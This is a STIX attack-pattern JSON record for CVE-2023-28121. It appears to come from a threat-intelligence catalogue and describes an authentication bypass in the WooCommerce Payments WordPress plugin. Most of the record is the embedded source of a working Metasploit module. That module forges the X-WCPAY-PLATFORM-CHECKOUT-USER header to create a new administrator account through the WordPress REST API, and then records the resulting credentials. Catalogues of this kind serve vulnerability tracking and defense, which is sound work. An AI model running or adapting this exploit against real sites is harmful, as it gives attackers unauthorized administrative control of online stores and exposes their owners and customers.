{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--91a4002d-a386-4545-b2fa-497c5ee96215",
    "created": "2024-08-14T16:28:47.168858Z",
    "modified": "2024-08-14T16:28:47.168861Z",
    "name": "Wordpress Plugin WooCommerce Payments Unauthenticated Admin Creation",
    "description": " WooCommerce-Payments plugin for Wordpress versions 4.8', '4.8.2, 4.9', '4.9.1 5.0', '5.0.4, 5.1', '5.1.3, 5.2', '5.2.2, 5.3', '5.3.1, 5.4', '5.4.1 5.5', '5.5.2, and 5.6', '5.6.2 contain an authentication bypass by specifying a valid user ID number within the X-WCPAY-PLATFORM-CHECKOUT-USER header. With this authentication bypass, a user can then use the API to create a new user with administrative privileges on the target WordPress site IF the user ID selected corresponds to an administrator account.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/wp_woocommerce_payments_add_user.rb",
            "external_id": "wp_woocommerce_payments_add_user.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.rcesecurity.com/2023/07/patch-diffing-cve-2023-28121-to-compromise-a-woocommerce/"
        },
        {
            "source_name": "reference",
            "url": "https://developer.woocommerce.com/2023/03/23/critical-vulnerability-detected-in-woocommerce-payments-what-you-need-to-know/"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-28121"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Wordpress Plugin WooCommerce Payments Unauthenticated Admin Creation',\n        'Description' => %q{\n          WooCommerce-Payments plugin for Wordpress versions 4.8', '4.8.2, 4.9', '4.9.1,\n          5.0', '5.0.4, 5.1', '5.1.3, 5.2', '5.2.2, 5.3', '5.3.1, 5.4', '5.4.1,\n          5.5', '5.5.2, and 5.6', '5.6.2 contain an authentication bypass by specifying a valid user ID number\n          within the X-WCPAY-PLATFORM-CHECKOUT-USER header. With this authentication bypass, a user can then use the API\n          to create a new user with administrative privileges on the target WordPress site IF the user ID\n          selected corresponds to an administrator account.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die', # msf module\n          'Michael Mazzolini', # original discovery\n          'Julien Ahrens' # detailed writeup\n        ],\n        'References' => [\n          ['URL', 'https://www.rcesecurity.com/2023/07/patch-diffing-cve-2023-28121-to-compromise-a-woocommerce/'],\n          ['URL', 'https://developer.woocommerce.com/2023/03/23/critical-vulnerability-detected-in-woocommerce-payments-what-you-need-to-know/'],\n          ['CVE', '2023-28121']\n        ],\n        'DisclosureDate' => '2023-03-22',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => [IOC_IN_LOGS]\n        }\n      )\n    )\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptString.new('USERNAME', [true, 'User to create', '']),\n        OptString.new('PASSWORD', [false, 'Password to create, random if blank', '']),\n        OptString.new('EMAIL', [false, 'Email to create, random if blank', '']),\n        OptInt.new('ADMINID', [false, 'ID Number of a WordPress administrative user', 1]),\n        OptString.new('TARGETURI', [true, 'The URI of the Wordpress instance', '/'])\n      ]\n    )\n  end\n\n  def check\n    unless wordpress_and_online?\n      return Msf::Exploit::CheckCode::Safe('Server not online or not detected as wordpress')\n    end\n\n    vuln_versions = [\n      ['4.8', '4.8.2'],\n      ['4.9', '4.9.1'],\n      ['5.0', '5.0.4'],\n      ['5.1', '5.1.3'],\n      ['5.2', '5.2.2'],\n      ['5.3', '5.3.1'],\n      ['5.4', '5.4.1'],\n      ['5.5', '5.5.2'],\n      ['5.6', '5.6.2']\n    ]\n\n    vuln_versions.each do |versions|\n      introduced = versions[0]\n      fixed = versions[1]\n      checkcode = check_plugin_version_from_readme('woocommerce-payments', fixed, introduced)\n      if checkcode == Exploit::CheckCode::Appears\n        return Msf::Exploit::CheckCode::Appears('WooCommerce-Payments version is exploitable')\n      end\n    end\n\n    Msf::Exploit::CheckCode::Safe('WooCommerce-Payments version not vulnerable or plugin not installed')\n  end\n\n  def run\n    password = datastore['PASSWORD']\n    if datastore['PASSWORD'].blank?\n      password = Rex::Text.rand_text_alphanumeric(10..15)\n    end\n\n    email = datastore['EMAIL']\n    if datastore['EMAIL'].blank?\n      email = Rex::Text.rand_mail_address\n    end\n\n    username = datastore['USERNAME']\n    if datastore['USERNAME'].blank?\n      username = Rex::Text.rand_text_alphanumeric(5..20)\n    end\n\n    print_status(\"Attempting to create an administrator user -> #{username}:#{password} (#{email})\")\n    ['/', 'index.php', '/rest'].each do |url_root| # try through both '' and 'index.php' since API can be in 2 diff places based on install/rewrites\n      if url_root == '/rest'\n        res = send_request_cgi({\n          'uri' => normalize_uri(target_uri.path),\n          'headers' => { \"X-WCPAY-PLATFORM-CHECKOUT-USER\": datastore['ADMINID'] },\n          'method' => 'POST',\n          'ctype' => 'application/json',\n          'vars_get' => { 'rest_route' => 'wp-json/wp/v2/users' },\n          'data' => {\n            'username' => username,\n            'email' => email,\n            'password' => password,\n            'roles' => ['administrator']\n          }.to_json\n        })\n      else\n        res = send_request_cgi({\n          'uri' => normalize_uri(target_uri.path, url_root, 'wp-json', 'wp', 'v2', 'users'),\n          'headers' => { \"X-WCPAY-PLATFORM-CHECKOUT-USER\": datastore['ADMINID'] },\n          'method' => 'POST',\n          'ctype' => 'application/json',\n          'data' => {\n            'username' => username,\n            'email' => email,\n            'password' => password,\n            'roles' => ['administrator']\n          }.to_json\n        })\n      end\n      fail_with(Failure::Unreachable, 'Connection failed') unless res\n      next if res.code == 404\n\n      if res.code == 201 && res.body&.match(/\"email\":\"#{email}\"/) && res.body&.match(/\"username\":\"#{username}\"/)\n        print_good('User was created successfully')\n        if framework.db.active\n          create_credential_and_login({\n            address: rhost,\n            port: rport,\n            protocol: 'tcp',\n            workspace_id: myworkspace_id,\n            origin_type: :service,\n            service_name: 'WordPress',\n            username: username,\n            private_type: :password,\n            private_data: password,\n            module_fullname: fullname,\n            access_level: 'administrator',\n            last_attempted_at: DateTime.now,\n            status: Metasploit::Model::Login::Status::SUCCESSFUL\n          })\n        end\n      else\n        print_error(\"Server response: #{res.body}\")\n      end\n      break # we didn't get a 404 so we can bail on the 2nd attempt\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2023-03-22"
}